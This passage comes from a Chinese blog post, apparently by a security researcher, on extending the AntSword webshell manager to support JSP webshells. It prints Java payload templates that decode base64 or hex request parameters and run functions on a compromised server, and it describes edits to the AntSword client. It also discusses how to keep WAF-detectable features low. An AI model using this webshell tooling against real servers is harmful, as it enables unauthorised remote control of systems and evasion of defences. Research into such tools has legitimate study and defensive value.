+</span></span><span class="line"><span class="cl">import javax.servlet.jsp.PageContext;
+</span></span><span class="line"><span class="cl">import java.io.ByteArrayOutputStream;
+</span></span><span class="line"><span class="cl">public class Demo {
+</span></span><span class="line"><span class="cl">    public String encoder;
+</span></span><span class="line"><span class="cl">    public String cs;
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public boolean equals(Object obj) {
+</span></span><span class="line"><span class="cl">        PageContext page = (PageContext)obj;
+</span></span><span class="line"><span class="cl">        ServletRequest request = page.getRequest();
+</span></span><span class="line"><span class="cl">        ServletResponse response = page.getResponse();
+</span></span><span class="line"><span class="cl">        encoder = request.getParameter(&#34;encoder&#34;)!=null?request.getParameter(&#34;encoder&#34;):&#34;&#34;;
+</span></span><span class="line"><span class="cl">        cs=request.getParameter(&#34;charset&#34;)!=null?request.getParameter(&#34;charset&#34;):&#34;UTF-8&#34;;
+</span></span><span class="line"><span class="cl">        StringBuffer output = new StringBuffer(&#34;&#34;);
+</span></span><span class="line"><span class="cl">        StringBuffer sb = new StringBuffer(&#34;&#34;);
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            response.setContentType(&#34;text/html&#34;);
+</span></span><span class="line"><span class="cl">            request.setCharacterEncoding(cs);
+</span></span><span class="line"><span class="cl">            response.setCharacterEncoding(cs);
+</span></span><span class="line"><span class="cl">            String var0 = EC(decode(request.getParameter(&#34;var0&#34;)+&#34;&#34;));
+</span></span><span class="line"><span class="cl">            String var1 = EC(decode(request.getParameter(&#34;var1&#34;)+&#34;&#34;));
+</span></span><span class="line"><span class="cl">            String var2 = EC(decode(request.getParameter(&#34;var2&#34;)+&#34;&#34;));
+</span></span><span class="line"><span class="cl">            String var3 = EC(decode(request.getParameter(&#34;var3&#34;)+&#34;&#34;));
+</span></span><span class="line"><span class="cl">            output.append(&#34;-&gt;&#34; + &#34;|&#34;);
+</span></span><span class="line"><span class="cl">            sb.append(func(var1));
+</span></span><span class="line"><span class="cl">            output.append(sb.toString());
+</span></span><span class="line"><span class="cl">            output.append(&#34;|&#34; + &#34;&lt;-&#34;);
+</span></span><span class="line"><span class="cl">            page.getOut().print(output.toString());
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">            sb.append(&#34;ERROR&#34; + &#34;:// &#34; + e.toString());
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return true;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    String EC(String s) throws Exception {
+</span></span><span class="line"><span class="cl">        if(encoder.equals(&#34;hex&#34;)) return s;
+</span></span><span class="line"><span class="cl">        return new String(s.getBytes(), cs);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    String decode(String str) throws Exception{
+</span></span><span class="line"><span class="cl">        if(encoder.equals(&#34;hex&#34;)){
+</span></span><span class="line"><span class="cl">            if(str==&#34;null&#34;||str.equals(&#34;null&#34;)){
+</span></span><span class="line"><span class="cl">                return &#34;&#34;;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            String hexString = &#34;0123456789ABCDEF&#34;;
+</span></span><span class="line"><span class="cl">            str = str.toUpperCase();
+</span></span><span class="line"><span class="cl">            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);
+</span></span><span class="line"><span class="cl">            String ss = &#34;&#34;;
+</span></span><span class="line"><span class="cl">            for (int i = 0; i &lt; str.length(); i += 2){
+</span></span><span class="line"><span class="cl">                ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &#34;,&#34;;
+</span></span><span class="line"><span class="cl">                baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))));
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            return baos.toString(&#34;UTF-8&#34;);
+</span></span><span class="line"><span class="cl">        }else if(encoder.equals(&#34;base64&#34;)){
+</span></span><span class="line"><span class="cl">            byte[] bt = null;
+</span></span><span class="line"><span class="cl">            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
+</span></span><span class="line"><span class="cl">            bt = decoder.decodeBuffer(str);
+</span></span><span class="line"><span class="cl">            return new String(bt,&#34;UTF-8&#34;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return str;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    String func (String var1){
+</span></span><span class="line"><span class="cl">    // Your code
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>举个栗子，写一个返回hello+名字的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import javax.servlet.ServletRequest;
+</span></span><span class="line"><span class="cl">import javax.servlet.ServletResponse;
+</span></span><span class="line"><span class="cl">import javax.servlet.jsp.PageContext;
+</span></span><span class="line"><span class="cl">import java.io.ByteArrayOutputStream;
+</span></span><span class="line"><span class="cl">public class Test {
+</span></span><span class="line"><span class="cl">    public String encoder;
+</span></span><span class="line"><span class="cl">    public String cs;
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public boolean equals(Object obj) {
+</span></span><span class="line"><span class="cl">        PageContext page = (PageContext)obj;
+</span></span><span class="line"><span class="cl">        ServletRequest request = page.getRequest();
+</span></span><span class="line"><span class="cl">        ServletResponse response = page.getResponse();
+</span></span><span class="line"><span class="cl">        encoder = request.getParameter(&#34;encoder&#34;)!=null?request.getParameter(&#34;encoder&#34;):&#34;&#34;;
+</span></span><span class="line"><span class="cl">        cs=request.getParameter(&#34;charset&#34;)!=null?request.getParameter(&#34;charset&#34;):&#34;UTF-8&#34;;
+</span></span><span class="line"><span class="cl">        StringBuffer output = new StringBuffer(&#34;&#34;);
+</span></span><span class="line"><span class="cl">        StringBuffer sb = new StringBuffer(&#34;&#34;);
+</span></span><span class="line"><span class="cl">        try {
+</span></span><span class="line"><span class="cl">            response.setContentType(&#34;text/html&#34;);
+</span></span><span class="line"><span class="cl">            request.setCharacterEncoding(cs);
+</span></span><span class="line"><span class="cl">            response.setCharacterEncoding(cs);
+</span></span><span class="line"><span class="cl">            String var0 = EC(decode(request.getParameter(&#34;var0&#34;)+&#34;&#34;));
+</span></span><span class="line"><span class="cl">            output.append(&#34;-&gt;&#34; + &#34;|&#34;);
+</span></span><span class="line"><span class="cl">            sb.append(test(var0));
+</span></span><span class="line"><span class="cl">            output.append(sb.toString());
+</span></span><span class="line"><span class="cl">            output.append(&#34;|&#34; + &#34;&lt;-&#34;);
+</span></span><span class="line"><span class="cl">            page.getOut().print(output.toString());
+</span></span><span class="line"><span class="cl">        } catch (Exception e) {
+</span></span><span class="line"><span class="cl">            sb.append(&#34;ERROR&#34; + &#34;:// &#34; + e.toString());
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return true;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    String EC(String s) throws Exception {
+</span></span><span class="line"><span class="cl">        if(encoder.equals(&#34;hex&#34;)) return s;
+</span></span><span class="line"><span class="cl">        return new String(s.getBytes(), cs);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    String decode(String str) throws Exception{
+</span></span><span class="line"><span class="cl">        if(encoder.equals(&#34;hex&#34;)){
+</span></span><span class="line"><span class="cl">            if(str==&#34;null&#34;||str.equals(&#34;null&#34;)){
+</span></span><span class="line"><span class="cl">                return &#34;&#34;;
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            String hexString = &#34;0123456789ABCDEF&#34;;
+</span></span><span class="line"><span class="cl">            str = str.toUpperCase();
+</span></span><span class="line"><span class="cl">            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);
+</span></span><span class="line"><span class="cl">            String ss = &#34;&#34;;
+</span></span><span class="line"><span class="cl">            for (int i = 0; i &lt; str.length(); i += 2){
+</span></span><span class="line"><span class="cl">                ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &#34;,&#34;;
+</span></span><span class="line"><span class="cl">                baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))));
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">            return baos.toString(&#34;UTF-8&#34;);
+</span></span><span class="line"><span class="cl">        }else if(encoder.equals(&#34;base64&#34;)){
+</span></span><span class="line"><span class="cl">            byte[] bt = null;
+</span></span><span class="line"><span class="cl">            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
+</span></span><span class="line"><span class="cl">            bt = decoder.decodeBuffer(str);
+</span></span><span class="line"><span class="cl">            return new String(bt,&#34;UTF-8&#34;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return str;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    String test(String var0){
+</span></span><span class="line"><span class="cl">        return &#34;Hello&#34; + var0;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将其编译成class文件，base64后输出到Test.txt中</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377200-6624723f-a55e-4e92-962c-2e000ca5c369.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377200-6624723f-a55e-4e92-962c-2e000ca5c369.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377200-6624723f-a55e-4e92-962c-2e000ca5c369.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377200-6624723f-a55e-4e92-962c-2e000ca5c369.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377200-6624723f-a55e-4e92-962c-2e000ca5c369.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377200-6624723f-a55e-4e92-962c-2e000ca5c369.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>再发送payload，其中var0是我们要传入的参数。可以看到屏幕上打印出了<code>Hello yzddmr6</code></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377288-46721820-1df2-4531-baf0-9110aa8cbd8c.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377288-46721820-1df2-4531-baf0-9110aa8cbd8c.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377288-46721820-1df2-4531-baf0-9110aa8cbd8c.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377288-46721820-1df2-4531-baf0-9110aa8cbd8c.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377288-46721820-1df2-4531-baf0-9110aa8cbd8c.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377288-46721820-1df2-4531-baf0-9110aa8cbd8c.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>默认是明文传递，想要进行base64编码的话将<code>encoder=base64</code>加在请求中即可。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377392-0e0f862a-0c6e-44d0-b79c-d8eb29837d8b.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377392-0e0f862a-0c6e-44d0-b79c-d8eb29837d8b.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377392-0e0f862a-0c6e-44d0-b79c-d8eb29837d8b.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377392-0e0f862a-0c6e-44d0-b79c-d8eb29837d8b.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377392-0e0f862a-0c6e-44d0-b79c-d8eb29837d8b.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377392-0e0f862a-0c6e-44d0-b79c-d8eb29837d8b.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>如果是手工发送的话要注意：</p>
+<p><strong>一定要URL编码！！！</strong></p>
+<p><strong>一定要URL编码！！！</strong></p>
+<p><strong>一定要URL编码！！！</strong></p>
+<p>当初忘了给Payload URL编码，一直各种花式报错，卡在这里一天。。。最后在rebeyond大佬提醒下才反应过来。。。我真是个弟弟</p>
+<h4 id="蚁剑客户端修改" class="headerLink">
+    <a href="#%e8%9a%81%e5%89%91%e5%ae%a2%e6%88%b7%e7%ab%af%e4%bf%ae%e6%94%b9" class="header-mark"></a>2.3.4 蚁剑客户端修改</h4><p>在<code>\source\app.entry.js</code> <code>\source\core\index.js</code> <code>\source\modules\settings\encoders.js</code>里增加jsp类型</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377491-5c116c5c-a3c2-4698-bb77-13c6cf48c3ad.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377491-5c116c5c-a3c2-4698-bb77-13c6cf48c3ad.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377491-5c116c5c-a3c2-4698-bb77-13c6cf48c3ad.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377491-5c116c5c-a3c2-4698-bb77-13c6cf48c3ad.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377491-5c116c5c-a3c2-4698-bb77-13c6cf48c3ad.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377491-5c116c5c-a3c2-4698-bb77-13c6cf48c3ad.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>在<code>\source\modules\shellmanager\list\form.js</code>增加对jsp后缀shell类型的识别</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377578-a281bd12-b05a-44fa-904d-8aa1d8ee1a4a.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377578-a281bd12-b05a-44fa-904d-8aa1d8ee1a4a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377578-a281bd12-b05a-44fa-904d-8aa1d8ee1a4a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377578-a281bd12-b05a-44fa-904d-8aa1d8ee1a4a.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377578-a281bd12-b05a-44fa-904d-8aa1d8ee1a4a.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377578-a281bd12-b05a-44fa-904d-8aa1d8ee1a4a.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>在base64编码器模板里增加发送的接口，虽然没有实现decoder，但是还是留个接口吧。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377660-efbb271e-8ef8-454f-80c5-ae78e99aea0b.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377660-efbb271e-8ef8-454f-80c5-ae78e99aea0b.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377660-efbb271e-8ef8-454f-80c5-ae78e99aea0b.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377660-efbb271e-8ef8-454f-80c5-ae78e99aea0b.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377660-efbb271e-8ef8-454f-80c5-ae78e99aea0b.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377660-efbb271e-8ef8-454f-80c5-ae78e99aea0b.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>然后就是用编译后的payload替换原来的函数名</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377794-cd64d8ed-762a-4c8e-bee3-59ff6e530877.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377794-cd64d8ed-762a-4c8e-bee3-59ff6e530877.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377794-cd64d8ed-762a-4c8e-bee3-59ff6e530877.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377794-cd64d8ed-762a-4c8e-bee3-59ff6e530877.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377794-cd64d8ed-762a-4c8e-bee3-59ff6e530877.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377794-cd64d8ed-762a-4c8e-bee3-59ff6e530877.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h4 id="实现效果" class="headerLink">
+    <a href="#%e5%ae%9e%e7%8e%b0%e6%95%88%e6%9e%9c" class="header-mark"></a>2.3.5 实现效果</h4><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377926-a59ce1d5-3a21-4e4a-ac8d-186c4e7a6f19.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377926-a59ce1d5-3a21-4e4a-ac8d-186c4e7a6f19.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377926-a59ce1d5-3a21-4e4a-ac8d-186c4e7a6f19.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377926-a59ce1d5-3a21-4e4a-ac8d-186c4e7a6f19.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377926-a59ce1d5-3a21-4e4a-ac8d-186c4e7a6f19.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377926-a59ce1d5-3a21-4e4a-ac8d-186c4e7a6f19.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378054-8acd0b19-09f3-4f20-8340-f093c25ba42b.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378054-8acd0b19-09f3-4f20-8340-f093c25ba42b.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378054-8acd0b19-09f3-4f20-8340-f093c25ba42b.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378054-8acd0b19-09f3-4f20-8340-f093c25ba42b.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378054-8acd0b19-09f3-4f20-8340-f093c25ba42b.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378054-8acd0b19-09f3-4f20-8340-f093c25ba42b.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378184-2bede958-4205-495e-a3d1-8d52c6928e6f.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378184-2bede958-4205-495e-a3d1-8d52c6928e6f.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378184-2bede958-4205-495e-a3d1-8d52c6928e6f.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378184-2bede958-4205-495e-a3d1-8d52c6928e6f.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378184-2bede958-4205-495e-a3d1-8d52c6928e6f.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378184-2bede958-4205-495e-a3d1-8d52c6928e6f.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378309-a08aee5a-c350-4bf5-9964-5968b50a5fac.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378309-a08aee5a-c350-4bf5-9964-5968b50a5fac.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378309-a08aee5a-c350-4bf5-9964-5968b50a5fac.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378309-a08aee5a-c350-4bf5-9964-5968b50a5fac.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378309-a08aee5a-c350-4bf5-9964-5968b50a5fac.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378309-a08aee5a-c350-4bf5-9964-5968b50a5fac.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378690-a5468e9e-795c-4477-8787-8257852d8323.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378690-a5468e9e-795c-4477-8787-8257852d8323.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378690-a5468e9e-795c-4477-8787-8257852d8323.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378690-a5468e9e-795c-4477-8787-8257852d8323.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378690-a5468e9e-795c-4477-8787-8257852d8323.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378690-a5468e9e-795c-4477-8787-8257852d8323.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378842-bc83adb9-99e3-4955-879e-e56de21e91e8.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378842-bc83adb9-99e3-4955-879e-e56de21e91e8.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378842-bc83adb9-99e3-4955-879e-e56de21e91e8.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378842-bc83adb9-99e3-4955-879e-e56de21e91e8.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378842-bc83adb9-99e3-4955-879e-e56de21e91e8.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900378842-bc83adb9-99e3-4955-879e-e56de21e91e8.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>本地每个功能都测试过，也完美支持中文。用起来跟其他类型的shell没有什么区别，四舍五入那就等于没BUG吧~</p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>3 最后</h2><p>有同学可能会问为什么不写回显信息编码函数呢？</p>
+<p>因为在目前方式下特征太明显了，根本不需要根据回显信息就可以识别。写了后还会导致payload很长，并且还会增加一个<code>decoder=xxx</code>的特征，所以就没加。同时传递的<code>encoder=xxx</code>也没有编码，不管怎么编码都是WAF加一条规则的事情。</p>
+<p>目前只是处在能用的阶段，无法做到随机变量名等操作，存在很多的硬性特征。在找到有效的解决方法前，本功能可能并不会合并到蚁剑主体中。</p>
+<p>因为payload实在是太多了，所以我就单独开了一个项目来存放源码：<a href="https://github.com/yzddmr6/JspForAntSword" target="_blank" rel="noopener noreferrer">JspForAntSword</a> 如果有什么好的建议欢迎提pr</p>
+<p>修改后的蚁剑(2.1.x分支)：</p>
+<p><a href="https://github.com/yzddmr6/antSword/tree/v2.1.x" target="_blank" rel="noopener noreferrer">https://github.com/yzddmr6/antSword/tree/v2.1.x</a></p>
+<p>感谢@rebeyond大佬的提醒，同时也感谢@Medici.yan表哥这几天一直跟我交流那么多。</p>
+<p>深刻的体会到独学则无友。如果有什么写的不对的地方希望师傅们提出，希望大佬们能多带带弟弟QAQ。</p>
+</div>
+
+        
+
+
+<h2>相关内容</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/as-exploits/">As-Exploits: 中国蚁剑后渗透框架</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-4/">中国蚁剑源码分析</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-2/">蚁剑改造计划之实现其他参数的随机化</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-diy-1/">蚁剑改造计划之增加垃圾数据</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/antsword-xor-encoder-2/">基于随机Cookie的蚁剑动态秘钥编码器</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-03-28</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/antsword-diy-3/" data-title="蚁剑改造计划之实现JSP一句话" data-hashtags="中国蚁剑"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/antsword-diy-3/" data-hashtag="中国蚁剑"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/antsword-diy-3/" data-title="蚁剑改造计划之实现JSP一句话"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/antsword-diy-3/" data-title="蚁剑改造计划之实现JSP一句话"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/antsword-diy-3/" data-title="蚁剑改造计划之实现JSP一句话"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/antsword-diy-3/" data-title="蚁剑改造计划之实现JSP一句话" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
